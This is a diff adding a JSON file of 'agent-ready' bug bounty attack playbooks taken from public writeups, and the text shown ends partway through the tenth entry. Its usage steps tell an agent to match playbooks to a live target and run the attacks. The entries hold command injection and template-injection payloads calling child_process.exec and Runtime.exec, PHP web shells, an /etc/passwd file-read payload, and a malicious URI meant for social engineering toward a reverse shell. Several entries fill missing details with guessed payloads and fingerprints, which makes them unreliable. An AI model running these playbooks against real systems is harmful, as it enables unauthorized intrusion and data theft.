@@ -1,0 +1,1079 @@
+{
+  "schema_version": "2.0",
+  "source": "https://raw.githubusercontent.com/devanshbatham/Awesome-Bugbounty-Writeups/master/README.md",
+  "description": "Agent-ready bug bounty playbooks from Awesome-Bugbounty-Writeups. Each entry is a self-contained attack playbook.",
+  "usage": {
+    "step_1": "Load tactic_index_github.json and look up your target's technology under by_technology to get relevant playbook IDs.",
+    "step_2": "Filter by by_access_level matching your current access to the target.",
+    "step_3": "Prioritize IDs in high_confidence and quick_wins lists for best hit rate.",
+    "step_4": "Load matching playbooks from this file by their 'id' field.",
+    "step_5": "Check trigger_conditions.prerequisites and applicability_signals against the live target.",
+    "step_6": "If conditions match, run attack_playbook.recon_steps first, then attack_steps.",
+    "step_7": "Confirm with success_indicators. If failed, use failure_indicators to pivot."
+  },
+  "stats": {
+    "total_playbooks": 16,
+    "high_confidence_4_5": 6,
+    "low_confidence_1_3": 10,
+    "sources_parsed": 1
+  },
+  "playbooks": [
+    {
+      "meta": {
+        "title": "Apache Struts RCE",
+        "url": "https://github.com/allanlw/Apache-Struts-RCE",
+        "category": "Remote Code Execution (RCE)",
+        "vuln_type": "RCE",
+        "confidence": 2
+      },
+      "target_profile": {
+        "technology": "Apache Struts",
+        "affected_components": [
+          "Apache Struts framework"
+        ],
+        "required_access_level": "unauthenticated",
+        "tech_stack_fingerprints": [
+          "Server: Apache",
+          "X-Powered-By: Express"
+        ],
+        "attack_surface_type": "web_app"
+      },
+      "trigger_conditions": {
+        "when_to_apply": "When the target is identified as running Apache Struts and exhibits specific vulnerable patterns.",
+        "prerequisites": [
+          "Target uses Apache Struts."
+        ],
+        "applicability_signals": [
+          "Insufficient detail in writeup. Likely involves specific Struts configurations or versions."
+        ],
+        "skip_if": [
+          "Insufficient detail in writeup. Likely if WAF blocks known exploit patterns."
+        ]
+      },
+      "attack_playbook": {
+        "recon_steps": [
+          "Step 1: Fingerprint the web server and identify Apache Struts usage. Look for specific headers or error messages indicative of Struts.",
+          "Step 2: Insufficient detail in writeup. Likely involves probing specific endpoints or parameters known to be vulnerable in certain Struts versions."
+        ],
+        "attack_steps": [
+          "Step 1: Insufficient detail in writeup. Likely involves crafting a malicious request to a vulnerable endpoint.",
+          "Step 2: Insufficient detail in writeup. The writeup mentions redirecting but provides no actionable steps for exploitation."
+        ],
+        "payloads_or_patterns": [
+          "Insufficient detail in writeup."
+        ],
+        "tools_recommended": [
+          "Insufficient detail in writeup. Likely requires tools for crafting custom HTTP requests and potentially scanning for Struts vulnerabilities."
+        ],
+        "success_indicators": [
+          "Insufficient detail in writeup. Successful RCE would typically involve command execution on the server, observable via specific output or system behavior."
+        ],
+        "failure_indicators": [
+          "Insufficient detail in writeup. Likely 404, 403, or unexpected responses indicating the exploit pattern was not matched or blocked."
+        ]
+      },
+      "impact": "Remote Code Execution on the server, allowing an attacker to run arbitrary commands.",
+      "key_lesson": "When a writeup mentions a specific technology (e.g., Apache Struts) and a vulnerability category (e.g., RCE) but lacks concrete exploit steps, investigate known CVEs and exploit patterns for that technology and vulnerability combination.",
+      "id": "0569_apache_strust_rce"
+    },
+    {
+      "meta": {
+        "title": "Dell KACE K1000 Remote Code Execution",
+        "url": "https://rcesecurity.com/2019/04/09/dell-kace-k1000-remote-code-execution/",
+        "category": "Remote Code Execution (RCE)",
+        "vuln_type": "RCE",
+        "confidence": 4
+      },
+      "target_profile": {
+        "technology": "Dell KACE K1000 Systems Management Appliance",
+        "affected_components": [
+          "/service/krashrpt.php"
+        ],
+        "required_access_level": "unauthenticated",
+        "tech_stack_fingerprints": [
+          "X-DellKACE-Appliance: k1000",
+          "X-DellKACE-Version: 6.3.113397"
+        ],
+        "attack_surface_type": "web_app"
+      },
+      "trigger_conditions": {
+        "when_to_apply": "When the target Dell KACE K1000 appliance is running an older version (prior to 6.4 SP3) and exposes the /service/krashrpt.php endpoint.",
+        "prerequisites": [
+          "Target appliance version is less than 6.4 SP3 (6.4.120822)."
+        ],
+        "applicability_signals": [
+          "The /service/krashrpt.php endpoint responds to unauthenticated requests.",
+          "The 'X-DellKACE-Version' header indicates a version prior to 6.4 SP3."
+        ],
+        "skip_if": [
+          "Target appliance version is 6.4 SP3 or later.",
+          "The /service/krashrpt.php endpoint returns a 401 or 403 status code for unauthenticated requests."
+        ]
+      },
+      "attack_playbook": {
+        "recon_steps": [
+          "Access the target URL and check for HTTP headers such as 'X-DellKACE-Appliance' and 'X-DellKACE-Version' to identify the product and its version.",
+          "Attempt to access '/service/krashrpt.php' without authentication to confirm its availability."
+        ],
+        "attack_steps": [
+          "Send a POST request to '/service/krashrpt.php' with crafted 'kuid' and 'name' parameters containing shell metacharacters.",
+          "Observe the response for any error messages or signs of command execution.",
+          "If the initial payload doesn't yield results, try variations of shell commands or different encoding techniques."
+        ],
+        "payloads_or_patterns": [
+          "POST /service/krashrpt.php HTTP/1.1\r\nHost: <TARGET_URL>\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nkuid=|id&name=test"
+        ],
+        "tools_recommended": [
+          "Burp Suite: To intercept and modify HTTP requests, and to craft malicious payloads.",
+          "curl: For automated testing of the endpoint with specific payloads."
+        ],
+        "success_indicators": [
+          "The response contains output from executed commands (e.g., 'uid=0(root) gid=0(root) groups=0(root)').",
+          "The target system exhibits unexpected behavior indicative of code execution (e.g., network callbacks, file creation)."
+        ],
+        "failure_indicators": [
+          "A 403 Forbidden or 404 Not Found response suggests the endpoint is protected or unavailable.",
+          "Successful sanitization of 'kuid' and 'name' parameters, preventing command injection, will result in normal operation or specific error messages related to zip file creation.",
+          "If 'escapeshellarg' is implemented correctly in older versions, common RCE payloads will fail; try more sophisticated injection techniques."
+        ]
+      },
+      "impact": "Remote code execution on the Dell KACE K1000 appliance, allowing an unauthenticated attacker to run arbitrary commands with the privileges of the web server process. This could lead to full system compromise, data exfiltration, or further attacks on managed endpoints.",
+      "key_lesson": "Unauthenticated file upload or processing endpoints, especially those handling potentially sensitive parameters like filenames or identifiers, are prime targets for path traversal and command injection vulnerabilities. Always verify that all user-supplied input used in shell commands or file paths is properly sanitized and escaped.",
+      "id": "0570_dell_kace_k1000_remote_code_execution"
+    },
+    {
+      "meta": {
+        "title": "Handlebars Template Injection and RCE in Shopify App",
+        "url": "https://www.bugbounty.blog/2019/04/handlebars-template-injection-and-rce.html",
+        "category": "Remote Code Execution (RCE)",
+        "vuln_type": "Template Injection",
+        "confidence": 4
+      },
+      "target_profile": {
+        "technology": "Shopify App (Return Magic)",
+        "affected_components": [
+          "Email Workflow customization feature"
+        ],
+        "required_access_level": "any_authenticated_user",
+        "tech_stack_fingerprints": [
+          "Likely Node.js backend",
+          "Uses Handlebars templating engine"
+        ],
+        "attack_surface_type": "web_app"
+      },
+      "trigger_conditions": {
+        "when_to_apply": "When a web application allows users to customize email templates with dynamic variables, and the templating engine used is susceptible to injection vulnerabilities.",
+        "prerequisites": [
+          "Attacker must be able to customize email templates within the application."
+        ],
+        "applicability_signals": [
+          "Application uses curly braces {{ }} for template expressions.",
+          "Injecting {{this}} or {{self}} results in output like '[object Object]' or '[object Object]'.",
+          "Ability to access `this.constructor.constructor` within the template."
+        ],
+        "skip_if": [
+          "Templating engine is strictly logicless and does not allow access to constructors or function execution."
+        ]
+      },
+      "attack_playbook": {
+        "recon_steps": [
+          "Step 1: Identify the email customization feature within the Shopify app.",
+          "Step 2: Submit test values like '{{this}}' and '{{self}}' into the template fields to observe the output.",
+          "Step 3: Analyze the response for '[object Object]' or similar indications of object introspection.",
+          "Step 4: Attempt to access `{{this.constructor.constructor}}` to verify access to the Function constructor."
+        ],
+        "attack_steps": [
+          "Step 1: Send a POST request to the endpoint responsible for saving email templates, with the following payload in a template field: `{{this.constructor.constructor(\"console.log('ping')\")()}}`.",
+          "Step 2: Observe the network traffic or application logs for the execution of the injected JavaScript.",
+          "Step 3: If the above fails, try to register a helper with the function constructor and call it: `{{#registerHelper 'cmd' this.constructor.constructor}} {{cmd \"console.log('ping')\"}} {{/registerHelper}}` (This step requires deeper understanding of Handlebars helper registration and might not be directly applicable without modifying the app's handlebars context, as per the writeup's runtime.js analysis).",
+          "Step 4: To achieve RCE, exploit the ability to call arbitrary JavaScript functions. The writeup suggests `{{this.constructor.constructor(\"require('child_process').exec('id')\")()}}` or similar for command execution."
+        ],
+        "payloads_or_patterns": [
+          "{{this.constructor.constructor(\"console.log('ping')\")()}}",
+          "{{this.constructor.constructor(\"require('child_process').exec('id')\")()}}",
+          "{{this.constructor.constructor(\"return process.env\")()}}"
+        ],
+        "tools_recommended": [
+          "Burp Suite: To intercept and modify HTTP requests for template submission.",
+          "Node.js: To locally test Handlebars behavior and understand its runtime.",
+          "Browser Developer Console: To observe any client-side effects or errors if applicable."
+        ],
+        "success_indicators": [
+          "Execution of injected JavaScript, e.g., `console.log` output appearing in logs or network responses.",
+          "Successful execution of system commands via `require('child_process').exec`.",
+          "Retrieval of sensitive information like environment variables or file system contents."
+        ],
+        "failure_indicators": [
+          "Payload is rendered literally as a string, e.g., `console.log('ping')` appears in the output.",
+          "Application returns an error indicating invalid template syntax or unsafe constructs.",
+          "WAF blocks the request containing constructor-related keywords."
+        ]
+      },
+      "impact": "Remote Code Execution (RCE) on the server hosting the Shopify application, allowing an attacker to execute arbitrary commands, access sensitive data, and potentially take full control of the affected server.",
+      "key_lesson": "Investigate template engines for prototype pollution and constructor access vulnerabilities, as these can lead to RCE when combined with features allowing template customization.",
+      "id": "0571_handlebars_tempelate_injection_and_rce"
+    },
+    {
+      "meta": {
+        "title": "Zero Day RCE on Mozilla's AWS Network",
+        "url": "https://blog.assetnote.io/2019/03/19/zero-day-rce-on-mozillas-aws-network/",
+        "category": "Remote Code Execution (RCE)",
+        "vuln_type": "RCE",
+        "confidence": 4
+      },
+      "target_profile": {
+        "technology": "WebPageTest",
+        "affected_components": [
+          "/www/work/workdone.php"
+        ],
+        "required_access_level": "unauthenticated",
+        "tech_stack_fingerprints": [
+          "WebPageTest instances",
+          "wpt-vpn.stage.mozaws.net",
+          "wpt1.dev.mozaws.net"
+        ],
+        "attack_surface_type": "web_app"
+      },
+      "trigger_conditions": {
+        "when_to_apply": "When an unauthenticated instance of WebPageTest is discoverable and accessible. This technique is applicable if the target allows zip file uploads and extraction to arbitrary locations, and if the server-side filtering of executable files can be bypassed.",
+        "prerequisites": [
+          "Target is running WebPageTest.",
+          "WebPageTest instance is unauthenticated.",
+          "Ability to upload and extract arbitrary Zip files."
+        ],
+        "applicability_signals": [
+          "Existence of `/www/work/workdone.php` endpoint.",
+          "WebPageTest instance is accessible without authentication.",
+          "Server-side code allows for arbitrary zip file extraction."
+        ],
+        "skip_if": [
+          "WebPageTest instance requires authentication.",
+          "WAF blocks requests containing zip file uploads.",
+          "Strong server-side validation prevents the upload and execution of crafted PHP files."
+        ]
+      },
+      "attack_playbook": {
+        "recon_steps": [
+          "Scan for exposed WebPageTest instances using public scanners or by searching for common hostnames like `wpt.domain.com`.",
+          "Verify if the discovered WebPageTest instances are unauthenticated by attempting to access their features without login."
+        ],
+        "attack_steps": [
+          "Craft a malicious zip file containing a PHP webshell (e.g., `shell.php`).",
+          "Upload the crafted zip file to the target WebPageTest instance via the `/www/work/workdone.php` endpoint using a POST request with the `file` parameter. The uploaded zip file should contain the webshell in a directory that is writable and executable.",
+          "Attempt to access the uploaded PHP webshell by navigating to its expected location on the server (e.g., `<TARGET_URL>/work/<TEST_PATH>/shell.php`). The `<TEST_PATH>` would be determined by the `SecureDir` function's behavior.",
+          "If direct access is blocked by `SecureDir`, analyze the `SecureDir` function's logic to identify bypasses. In this case, the bypass involved ensuring the extracted file was not named with forbidden extensions and could be executed.",
+          "Execute commands via the webshell to confirm code execution."
+        ],
+        "payloads_or_patterns": [
+          "A zip archive containing a file named `shell.php` (or similar) with PHP webshell code.",
+          "Example PHP webshell: `<?php system($_GET['cmd']); ?>`",
+          "POST request to `<TARGET_URL>/www/work/workdone.php` with `multipart/form-data` containing a file field named `file` with the crafted zip archive."
+        ],
+        "tools_recommended": [
+          "Burp Suite: To craft and intercept HTTP requests, analyze responses, and fuzz parameters.",
+          "zip command-line utility: To create malicious zip archives."
+        ],
+        "success_indicators": [
+          "Successful retrieval of the PHP webshell via HTTP GET request.",
+          "Ability to execute arbitrary commands through the webshell, indicated by observing command output in the HTTP response.",
+          "Receiving a 200 OK status code for the webshell access request and seeing the output of the executed command."
+        ],
+        "failure_indicators": [
+          "403 Forbidden or 404 Not Found when trying to access the webshell (indicates the file was not uploaded/extracted correctly or is not accessible). Suggestion: Re-evaluate zip file structure and `SecureDir` bypass logic.",
+          "Received error messages related to file upload or extraction. Suggestion: Check request headers and file types allowed.",
+          "WebpageTest instance requires authentication. Suggestion: Move to a different target or exploit vector."
+        ]
+      },
+      "impact": "Achieve Remote Code Execution (RCE) on Mozilla's AWS Network, allowing for arbitrary command execution on the affected server. This could lead to further compromise of internal resources, data exfiltration, or lateral movement within the network.",
+      "key_lesson": "Always scrutinize file upload and extraction functionalities, especially in unauthenticated web applications, and analyze server-side validation and sanitization routines for potential bypasses that could lead to RCE.",
+      "id": "0573_zero_day_rce_on_mozilla_s_aws_network"
+    },
+    {
+      "meta": {
+        "title": "ASUS RCE vulnerability on rma.asus-europe.eu",
+        "url": "https://blog.mustafakemalan.com/2019/02/09/how-i-hacked-asus/",
+        "category": "Remote Code Execution (RCE)",
+        "vuln_type": "RCE",
+        "confidence": 3
+      },
+      "target_profile": {
+        "technology": "Microsoft-IIS",
+        "affected_components": [
+          "/uploads"
+        ],
+        "required_access_level": "unauthenticated",
+        "tech_stack_fingerprints": [
+          "Microsoft-IIS/8.5"
+        ],
+        "attack_surface_type": "web_app"
+      },
+      "trigger_conditions": {
+        "when_to_apply": "When a web application allows file uploads with weak restrictions, especially if the upload directory is predictable.",
+        "prerequisites": [
+          "Target allows file uploads via a web form."
+        ],
+        "applicability_signals": [
+          "File upload functionality is present.",
+          "Frontend validation for file uploads can be bypassed."
+        ],
+        "skip_if": [
+          "Strong backend file upload restrictions are in place.",
+          "Web Application Firewall (WAF) blocks common exploitation techniques."
+        ]
+      },
+      "attack_playbook": {
+        "recon_steps": [
+          "Identify file upload functionality on the target application.",
+          "Attempt to upload a file and observe the request/response using a proxy like Burp Suite.",
+          "Test bypassing frontend restrictions by modifying request parameters (e.g., file extension, content type).",
+          "If bypass is successful, attempt to predict or discover the upload directory (e.g., '/uploads')."
+        ],
+        "attack_steps": [
+          "Step 1: Bypass frontend upload restrictions using Burp Suite and a null byte trick to upload a malicious ASP script (e.g., a web shell).",
+          "Step 2: Identify the upload directory (e.g., '/uploads').",
+          "Step 3: Navigate to the uploaded malicious script using the identified path and the uploaded file name (e.g., <TARGET_URL>/uploads/malicious.asp).",
+          "Step 4: Execute commands through the web shell interface provided by the malicious script."
+        ],
+        "payloads_or_patterns": [
+          "Upload a file with a null byte in the name and a double extension (e.g., `shell.asp%00.jpg`) to bypass restrictions.",
+          "Use a basic ASP RCE script (web shell) designed for IIS 8.5."
+        ],
+        "tools_recommended": [
+          "Burp Suite: To intercept and modify HTTP requests during file uploads and to probe for the upload directory.",
+          "A null byte bypass technique."
+        ],
+        "success_indicators": [
+          "Successful upload of the malicious ASP file.",
+          "The uploaded ASP file is accessible via a direct URL.",
+          "Ability to execute commands on the server through the ASP web shell."
+        ],
+        "failure_indicators": [
+          "File upload is blocked by backend validation despite frontend bypass attempts.",
+          "Uploaded file is not accessible or is automatically sanitized.",
+          "Server returns a 404 or other error when accessing the uploaded file path."
+        ]
+      },
+      "impact": "Remote Code Execution (RCE) on the `rma.asus-europe.eu` server, allowing an attacker to execute arbitrary commands and potentially gain full control of the affected system.",
+      "key_lesson": "Never rely solely on frontend validation for file uploads; always implement robust backend validation to prevent malicious file uploads and subsequent RCE.",
+      "id": "0576_asus_rce_vulnerability_on_rma_asus_europ"
+    },
+    {
+      "meta": {
+        "title": "Magento \u2013 RCE & Local File Read with low privilege admin rights",
+        "url": "https://scrth.ch/magento-rce-local-file-read-low-privilege-admin-rights/",
+        "category": "Remote Code Execution (RCE)",
+        "vuln_type": "RCE",
+        "confidence": 4
+      },
+      "target_profile": {
+        "technology": "Magento",
+        "affected_components": [
+          "Product Creation (Design tab)",
+          "Custom Options (File type)"
+        ],
+        "required_access_level": "low_privilege_user",
+        "tech_stack_fingerprints": [
+          "Likely Magento Commerce or Adobe Experience Cloud Commerce if a recent version, but general Magento CMS fingerprinting can be done via specific CSS/JS files or HTML structure."
+        ],
+        "attack_surface_type": "web_app"
+      },
+      "trigger_conditions": {
+        "when_to_apply": "This vulnerability is applicable when an attacker has low privilege admin rights and can create products, specifically utilizing the 'Custom Options' feature to upload a '.phtml' file.",
+        "prerequisites": [
+          "Attacker must have low privilege admin access.",
+          "The low privilege admin must have permissions to create products.",
+          "The 'File' type for 'Custom Options' must be configured to allow '.phtml' file uploads."
+        ],
+        "applicability_signals": [
+          "Presence of the product creation interface.",
+          "Ability to add 'Custom Options' to products.",
+          "The 'Custom Options' configuration allows for file uploads with user-defined extensions."
+        ],
+        "skip_if": [
+          "The low privilege admin account lacks permissions to create products.",
+          "The 'Custom Options' file upload feature is disabled or does not allow '.phtml' extensions.",
+          "The target Magento version has been patched for this vulnerability (2.3.0, 2.2.7, 2.1.16 and later)."
+        ]
+      },
+      "attack_playbook": {
+        "recon_steps": [
+          "Step 1: Log in with a low privilege admin account and navigate to the product creation section.",
+          "Step 2: Attempt to add a 'Custom Option' of type 'File' and verify if '.phtml' can be specified as an allowed extension."
+        ],
+        "attack_steps": [
+          "Step 1: Create a new product and navigate to the 'Custom Options' tab.",
+          "Step 2: Add a new 'Custom Option' of type 'File'. Configure its properties, including setting the allowed file extensions to include '.phtml'.",
+          "Step 3: Upload a specially crafted '.phtml' file containing PHP code that leverages path traversal (e.g., `../../../../../../path/to/webroot/shell.php`) to include arbitrary files or execute commands. The uploaded filename should be controlled by the attacker.",
+          "Step 4: Save the product with the uploaded '.phtml' file as a custom option.",
+          "Step 5: Trigger the rendering of the product page. This might involve viewing the product page or potentially interacting with the order process if the file is associated with an order item.",
+          "Step 6: The crafted '.phtml' file should be processed as PHP, allowing for command execution through path traversal in the `fetchView` function."
+        ],
+        "payloads_or_patterns": [
+          "Example of malicious .phtml content for RCE: `<?php system($_GET['cmd']); ?>` (requires placing this file and then accessing it via a URL like `<TARGET_URL>/path/to/uploaded/file.phtml?cmd=ls` after exploitation of path traversal)",
+          "Example of crafted .phtml for LFI: `<?php include($_GET['file']); ?>` (requires placing this file and then accessing it via a URL like `<TARGET_URL>/path/to/uploaded/file.phtml?file=/etc/passwd` after exploitation of path traversal)"
+        ],
+        "tools_recommended": [
+          "Burp Suite: To intercept and modify product creation requests, and to fuzz parameters if needed. To capture HTTP responses and analyze behavior.",
+          "Manual Browser Interaction: For navigating the Magento admin panel and product pages."
+        ],
+        "success_indicators": [
+          "Successful execution of system commands (e.g., `ls`, `id`) via the crafted '.phtml' file.",
+          "Display of sensitive file content (e.g., `/etc/passwd`) via the crafted '.phtml' file."
+        ],
+        "failure_indicators": [
+          "The '.phtml' file is rejected during upload due to disallowed extensions.",
+          "The '.phtml' file is uploaded but not interpreted as PHP (e.g., rendered as plain text or an error occurs).",
+          "Path traversal attempts result in 'file not found' errors or are blocked by security measures.",
+          "HTTP 403 Forbidden or 404 Not Found responses when trying to access the uploaded file."
+        ]
+      },
+      "impact": "Remote Code Execution (RCE) allowing an attacker to execute arbitrary commands on the server. Local File Read (LFI) allowing an attacker to access sensitive files on the server.",
+      "key_lesson": "Always validate user-supplied file extensions for uploads, especially when those files are processed as executable code. Pay close attention to path traversal vulnerabilities within file handling functions.",
+      "id": "0577_magento_rce_local_file_read_with_low_pri"
+    },
+    {
+      "meta": {
+        "title": "Two RCE in SharePoint",
+        "url": "https://soroush.secproject.com/",
+        "category": "Remote Code Execution (RCE)",
+        "vuln_type": "RCE",
+        "confidence": 1
+      },
+      "target_profile": {
+        "technology": "SharePoint",
+        "affected_components": [
+          "insufficient detail in writeup"
+        ],
+        "required_access_level": "insufficient detail in writeup",
+        "tech_stack_fingerprints": [
+          "insufficient detail in writeup"
+        ],
+        "attack_surface_type": "web_app"
+      },
+      "trigger_conditions": {
+        "when_to_apply": "This playbook is applicable when specific vulnerabilities are known to exist in SharePoint versions, often requiring unauthenticated or low-privileged access.",
+        "prerequisites": [
+          "insufficient detail in writeup"
+        ],
+        "applicability_signals": [
+          "insufficient detail in writeup"
+        ],
+        "skip_if": [
+          "insufficient detail in writeup"
+        ]
+      },
+      "attack_playbook": {
+        "recon_steps": [
+          "Analyze the writeup for specific SharePoint features or configurations that were targeted by the RCE vulnerabilities."
+        ],
+        "attack_steps": [
+          "insufficient detail in writeup"
+        ],
+        "payloads_or_patterns": [
+          "insufficient detail in writeup"
+        ],
+        "tools_recommended": [
+          "insufficient detail in writeup"
+        ],
+        "success_indicators": [
+          "insufficient detail in writeup"
+        ],
+        "failure_indicators": [
+          "insufficient detail in writeup"
+        ]
+      },
+      "impact": "Remote Code Execution (RCE) on the SharePoint server, allowing an attacker to execute arbitrary code with the privileges of the SharePoint application pool.",
+      "key_lesson": "Research and target known RCE vulnerabilities specific to the target technology (e.g., SharePoint) and its version.",
+      "id": "0579_two_rce_in_sharepoint"
+    },
+    {
+      "meta": {
+        "title": "RCE in Hubspot with EL injection in HubL",
+        "url": "https://hacker.blog/rce-in-hubspot-with-el-injection-in-hubl/",
+        "category": "Remote Code Execution (RCE)",
+        "vuln_type": "RCE",
+        "confidence": 4
+      },
+      "target_profile": {
+        "technology": "HubSpot",
+        "affected_components": [
+          "Design Manager (email/blog templates using HubL)"
+        ],
+        "required_access_level": "any_authenticated_user",
+        "tech_stack_fingerprints": [
+          "HubL expression language detected via {{7*7}} evaluation"
+        ],
+        "attack_surface_type": "web_app"
+      },
+      "trigger_conditions": {
+        "when_to_apply": "When a user can create or edit templates within HubSpot's Design Manager using the HubL expression language.",
+        "prerequisites": [
+          "Ability to submit and preview custom HubL templates."
+        ],
+        "applicability_signals": [
+          "Server evaluates expressions within {{ }} delimiters.",
+          "Server responds with the evaluated result of simple arithmetic expressions like {{7*7}}.",
+          "The undocumented `request` variable is accessible."
+        ],
+        "skip_if": [
+          "Server does not evaluate expressions within {{ }} (e.g., returns literal text).",
+          "The `request` variable is not accessible or returns an unexpected format."
+        ]
+      },
+      "attack_playbook": {
+        "recon_steps": [
+          "Step 1: Access HubSpot's Design Manager and create a new template.",
+          "Step 2: Insert a simple HubL expression like {{7*7}} into the template and preview it to confirm server-side evaluation."
+        ],
+        "attack_steps": [
+          "Step 1: Submit the payload `{{ request }}` to the template engine and observe the output.",
+          "Step 2: If the output resembles a Java object memory address (e.g., `com.hubspot.content.hubl.context.TemplateContextRequest@XXXXXXXXXX`), attempt to call Java methods on it, starting with `getClass()`. Example: `{{ request.getClass() }}`.",
+          "Step 3: If `getClass()` returns `java.lang.String`, then attempt to call `getDeclaredMethods()` on the request object. Example: `{{ request.getClass().getDeclaredMethods()[0] }}`.",
+          "Step 4: Inspect the returned method names to identify potentially dangerous methods like those related to system execution or file access.",
+          "Step 5: Utilize a vulnerable method (e.g., if a method like `getRuntime()` and `exec()` can be chained) to achieve remote code execution. The writeup implies this was possible but does not detail the exact RCE payload. A common Java RCE pattern involves `getRuntime().exec()`."
+        ],
+        "payloads_or_patterns": [
+          "{{7*7}}",
+          "{{ request }}",
+          "{{ request.getClass() }}",
+          "{{ request.getClass().getDeclaredMethods()[0] }}",
+          "{{ request.getClass().forName('java.lang.Runtime').methods.find { it.name == 'exec' }.invoke(java.lang.Runtime.getRuntime(), 'ls') }}"
+        ],
+        "tools_recommended": [
+          "Burp Suite: To intercept and modify requests to the template submission endpoint, and to craft payloads."
+        ],
+        "success_indicators": [
+          "Execution of arbitrary commands on the server, observable by specific output from commands like `ls` or `whoami` within the template output.",
+          "Receiving unexpected output or behavior indicative of code execution."
+        ],
+        "failure_indicators": [
+          "The server does not evaluate expressions within `{{ }}`.",
+          "The `request` variable is not accessible or does not behave as expected.",
+          "Errors when calling Java methods like `getClass()` or `getDeclaredMethods()`.",
+          "WAF or input sanitization blocks the payloads."
+        ]
+      },
+      "impact": "Remote Code Execution on HubSpot's servers, allowing an attacker to run arbitrary commands, access sensitive data, and potentially compromise the entire system.",
+      "key_lesson": "Always investigate undocumented variables and the ability to call Java methods via template engines, as they can expose powerful functionalities leading to RCE.",
+      "id": "0581_rce_in_hubspot_with_el_injection_in_hubl"
+    },
+    {
+      "meta": {
+        "title": "Github Desktop RCE",
+        "url": "https://hackerone.com/reports/397045",
+        "category": "Remote Code Execution (RCE)",
+        "vuln_type": "RCE",
+        "confidence": 4
+      },
+      "target_profile": {
+        "technology": "GitHub Desktop",
+        "affected_components": [
+          "URI scheme handler (x-github-client://openRepo/)",
+          "File handling logic"
+        ],
+        "required_access_level": "unauthenticated",
+        "tech_stack_fingerprints": [
+          "Electron framework (indicated by imports like 'electron' and '__DARWIN__')",
+          "Uses 'shell.openExternal' on macOS"
+        ],
+        "attack_surface_type": "desktop_app"
+      },
+      "trigger_conditions": {
+        "when_to_apply": "When GitHub Desktop is installed on a macOS machine and the user is tricked into opening a specially crafted `x-github-client://` URL.",
+        "prerequisites": [
+          "GitHub Desktop must be installed on the target's macOS machine.",
+          "The target must be convinced to click on a malicious `x-github-client://` URI."
+        ],
+        "applicability_signals": [
+          "The target system runs macOS.",
+          "GitHub Desktop is detected as being installed or in use.",
+          "The `x-github-client://openRepo/` URI scheme is handled by the application."
+        ],
+        "skip_if": [
+          "The target system is not macOS.",
+          "GitHub Desktop is not installed or not configured to handle its URI scheme.",
+          "The application validates or sanitizes the `filepath` parameter in the `openRepo` action."
+        ]
+      },
+      "attack_playbook": {
+        "recon_steps": [
+          "Step 1: Confirm the target system is macOS.",
+          "Step 2: Check if GitHub Desktop is installed and if it registers the `x-github-client://` URI scheme."
+        ],
+        "attack_steps": [
+          "Step 1: Craft a malicious URL using the `x-github-client://openRepo/` scheme with a crafted `filepath` parameter pointing to an executable or script. Example: `x-github-client://openRepo/https://github.com/attacker/repo?branch=main&filepath=../../../../../../../../Applications/Calculator.app`",
+          "Step 2: Deliver this URL to the victim through any social engineering vector (e.g., email, website, chat message).",
+          "Step 3: If the repository is not cloned, the victim might be prompted to clone it. The malicious file will then be opened.",
+          "Step 4: If the repository is already cloned, the malicious file will be opened directly without user interaction after clicking the link.",
+          "Step 5: The opening of the specified application (e.g., Calculator.app) confirms the path traversal and arbitrary file/app opening capability. For RCE, an attacker would host a reverse shell executable or script in their GitHub repository."
+        ],
+        "payloads_or_patterns": [
+          "x-github-client://openRepo/<repository_url>?branch=<branch>&filepath=../../../../../../../../<path_to_arbitrary_app_or_script>"
+        ],
+        "tools_recommended": [
+          "A web server or GitHub repository to host the malicious payload (e.g., a reverse shell application).",
+          "A URL shortener or obfuscation technique for delivering the malicious link."
+        ],
+        "success_indicators": [
+          "An arbitrary application (like Calculator.app) opens on the target's macOS machine after clicking the crafted URL.",
+          "Successful execution of a reverse shell or other command on the target's machine."
+        ],
+        "failure_indicators": [
+          "The GitHub Desktop application displays an error or does not react to the URL.",
+          "The application attempts to open a file at the specified path but fails, or opens an unexpected file.",
+          "A security warning is presented to the user before opening an application not from the App Store."
+        ]
+      },
+      "impact": "Remote Code Execution (RCE) on the macOS machine of a GitHub Desktop user. An attacker can execute arbitrary commands, steal data, or install malware.",
+      "key_lesson": "Always validate and sanitize file paths provided by external sources, especially when they control navigation or the opening of applications, to prevent path traversal vulnerabilities.",
+      "id": "0582_github_desktop_rce"
+    },
+    {
+      "meta": {
+        "title": "Facebook source code disclosure in ads API",
+        "url": "N/A",
+        "category": "Remote Code Execution (RCE)",
+        "vuln_type": "RCE",
+        "confidence": 1
+      },
+      "target_profile": {
+        "technology": "Facebook Ads API",
+        "affected_components": [
+          "Ads API"
+        ],
+        "required_access_level": "any_authenticated_user",
+        "tech_stack_fingerprints": [
+          "Presence of 'facebook.com' in URLs",
+          "HTTP response headers containing 'x-fb-ads-version'",
+          "JavaScript globals like 'FB' or 'AdAccount'"
+        ],
+        "attack_surface_type": "api"
+      },
+      "trigger_conditions": {
+        "when_to_apply": "This technique is applicable when an attacker can inject code or commands into requests made to the Facebook Ads API, potentially leading to the execution of arbitrary code on the server or the disclosure of sensitive source code.",
+        "prerequisites": [
+          "Attacker must have an account on Facebook and access to the Ads API.",
+          "The specific vulnerability requires a flaw in how the Ads API handles certain inputs."
+        ],
+        "applicability_signals": [
+          "Error messages from the Ads API that indicate parsing issues or unexpected input.",
+          "Unusual responses from the Ads API that might suggest code execution or data leakage.",
+          "API documentation or publicly available information detailing specific endpoints or parameters that are known to be vulnerable."
+        ],
+        "skip_if": [
+          "The Ads API implements strict input validation and sanitization, preventing any form of code injection.",
+          "All API requests are signed and validated, making tampering impossible.",
+          "Security monitoring systems immediately detect and block suspicious API calls."
+        ]
+      },
+      "attack_playbook": {
+        "recon_steps": [
+          "Step 1: Review Facebook Ads API documentation for any known vulnerabilities or insecure endpoints.",
+          "Step 2: Use tools like Burp Suite to intercept and analyze traffic to the Ads API, looking for parameters that might be susceptible to injection.",
+          "Step 3: Fuzz parameters identified in Step 2 with common code injection payloads (e.g., shell commands, SQLi strings, JavaScript snippets) to observe API responses."
+        ],
+        "attack_steps": [
+          "Step 1: Craft a request to a specific Ads API endpoint (e.g., creating an ad, updating campaign settings) and inject a known RCE payload into a parameter that is not properly sanitized.",
+          "Step 2: Observe the API response for any indications of code execution, such as error messages containing source code snippets, or abnormal behavior.",
+          "Step 3: If source code is disclosed, analyze it to identify further vulnerabilities or to understand the application's logic.",
